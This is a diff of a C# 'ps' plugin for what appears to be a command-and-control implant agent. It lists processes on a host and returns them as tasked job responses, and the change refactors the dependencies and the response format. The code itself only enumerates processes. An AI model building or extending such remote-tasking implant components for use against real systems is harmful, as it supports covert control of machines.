@@ -13,12 +13,10 @@ namespace Agent
     {
         public string Name => "ps";
         private IMessageManager messageManager { get; set; }
-        private ITokenManager tokenManager { get; set; }
 
-        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
+        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
         {
             this.messageManager = messageManager;
-            this.tokenManager = tokenManager;
         }
         public async Task Execute(ServerJob job)
         {
@@ -35,18 +33,18 @@ namespace Agent
                     processes.AddRange(convertProcessToServerProcess(Process.GetProcesses()));
                 }
 
-                await messageManager.AddResponse(new ProcessTaskResponse
+                messageManager.AddTaskResponse(new ProcessTaskResponse
                 {
                     task_id = job.task.id,
                     completed = true,
-                    process_response = new Dictionary<string, string> { { "message", "0x2C" } },
+                    user_output = "Finished, check process browser for output",
                     processes = processes
                 });
 
             }
             catch (Exception e)
             {
-                await messageManager.AddResponse(new ProcessTaskResponse
+                messageManager.AddTaskResponse(new ProcessTaskResponse
                 {
                     task_id = job.task.id,
                     completed = true,
